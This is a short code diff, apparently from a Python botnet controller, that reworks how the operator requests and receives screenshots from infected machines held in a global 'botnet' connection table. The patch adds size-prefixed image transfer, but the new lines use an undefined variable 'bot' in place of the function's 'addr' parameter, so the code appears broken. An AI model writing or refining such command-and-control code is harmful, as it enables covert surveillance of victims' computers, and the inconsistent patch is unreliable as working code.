@@ -110,16 +110,17 @@ def check_container(bot):
 def get_screenshot(addr):
     global botnet
     botnet[addr].send("screenshot".encode())
-    resp = botnet[addr].recv(1024000)
+    resp = botnet[addr].recv(1024)
     try:
         if(resp.decode() == "FAILED"):
             print("[*] Failed to get screenshot from %s"%(addr))
             return
-        else:
+        elif(resp.decode() == "OK"):
             pass
     except:
         pass
-    image = resp
+    size = botnet[bot].recv(1024).decode()
+    image = botnet[bot].recv(int(size))
     check_container(addr)
     #os.chdir(addr)
     file = open("scrnshot.png",'wb')
